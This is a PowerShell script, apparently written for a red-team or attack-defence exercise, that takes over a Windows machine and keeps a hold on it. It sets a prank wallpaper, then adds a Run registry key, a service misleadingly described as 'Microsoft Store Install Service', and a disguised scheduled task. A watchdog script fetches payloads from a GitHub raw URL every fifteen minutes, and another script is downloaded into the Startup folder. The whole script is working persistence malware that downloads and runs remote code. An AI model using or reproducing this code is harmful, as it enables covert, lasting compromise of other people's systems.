# Download Pig Poop Balls and set as wallpaper

if (-not (Test-Path "C:\Windows\secpol.jpeg")){
    Invoke-WebRequest -Uri 'https://i.imgur.com/jArJz56.jpeg' -OutFile 'C:\Windows\secpol.jpeg'
}

if ((Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper).Wallpaper -ne 'C:\Windows\secpol.jpeg'){
  Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value 'C:\Windows\secpol.jpeg'
  RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
}

# Create Registry Key to start NetDiag on startup

New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name NetworkDiagnostic -Value 'C:\Windows\Help\NetworkDiagnostic.ps1' -Force | Out-Null

# Create Service to start NetDiag

New-Service -Name "InstallServlce" -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Help\NetworkDiagnostic.ps1" -Description "Microsoft Store Install Service" -ErrorAction SilentlyContinue
Set-Service -Name "InstallServlce" -StartupType Automatic

# Create Sysmon.ps1 which redownloads netdiag

if (-not (Test-Path "C:\Windows\Logs\Sysmon.ps1")){
    New-Item -ItemType File -Path "C:\Windows\Logs\Sysmon.ps1"
    Set-Content -Path "C:\Windows\Logs\Sysmon.ps1" -Value "while($true){if(-not (Test-Path 'C:\Windows\Help\NetworkDiagnostic.ps1')){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/NetworkDiagnostic.ps1' -OutFile 'C:\Windows\Help\NetworkDiagnostic.ps1'}Start-Sleep -Seconds 900}"
}

# Create scheduled task to run sysmon.ps1

if (-not (Get-ScheduledTask -TaskName UpdatAssistant -ErrorAction SilentlyContinue)){
    $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument 'C:\Windows\Logs\Sysmon.ps1'
    $repetitionInterval = [TimeSpan]::FromSeconds(900)
    $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30) -RepetitionInterval $repetitionInterval -RepetitionDuration ([TimeSpan]::MaxValue)
    Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName 'UpdatAssistant'
}

# Download mean startup script
if (-not (Test-Path "$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1")){
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lfgberg/erm/master/WMIsvc.ps1' -OutFile '$env:appdata\Microsoft\Windows\Start Menu\Programs\StartUp\WMIsvc.ps1'
}